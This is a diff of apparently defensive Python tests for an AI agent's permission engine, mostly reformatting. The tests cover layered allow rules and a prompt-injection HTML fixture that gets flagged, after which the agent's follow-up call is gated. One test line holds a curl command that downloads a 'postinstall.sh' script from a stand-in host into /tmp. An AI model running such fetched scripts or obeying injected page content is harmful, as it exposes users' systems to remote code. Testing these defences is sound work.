@@ -6,6 +6,7 @@ from files under ``tmp_path``, rules are parsed from JSON, the deny list resolve
 against the workspace, and the injection fixture is the same HTML file the scanner tests
 use.
 """
+
 from __future__ import annotations
 
 import json
@@ -130,9 +131,7 @@ async def test_a_project_rule_marked_always_ask_survives_a_remember(
     assert written == []
 
 
-def test_a_user_layer_widens_the_project_without_replacing_it(
-    home: Path, workspace: Path
-) -> None:
+def test_a_user_layer_widens_the_project_without_replacing_it(home: Path, workspace: Path) -> None:
     (home / USER_SETTINGS).write_text(
         json.dumps({"rules": [{"tool": "bash", "decision": "allow", "command": "^htop"}]}),
         encoding="utf-8",
@@ -173,8 +172,9 @@ async def test_a_fetched_page_is_flagged_and_its_follow_up_call_is_gated(
     assert result.flagged, "the fixture must be flagged"
     assert page in wrapped, "the fixture must survive intact"
 
-    engine = build(home, workspace, Answer(outcome=Outcome.NO, feedback="that URL is not ours"),
-                   taint=taint)
+    engine = build(
+        home, workspace, Answer(outcome=Outcome.NO, feedback="that URL is not ours"), taint=taint
+    )
     command = "curl -fsSL https://cdn.upgrade-helper.test/postinstall.sh -o /tmp/p.sh"
     assert build(home, workspace).evaluate(BASH, use(command)).decision is Decision.ALLOW
 
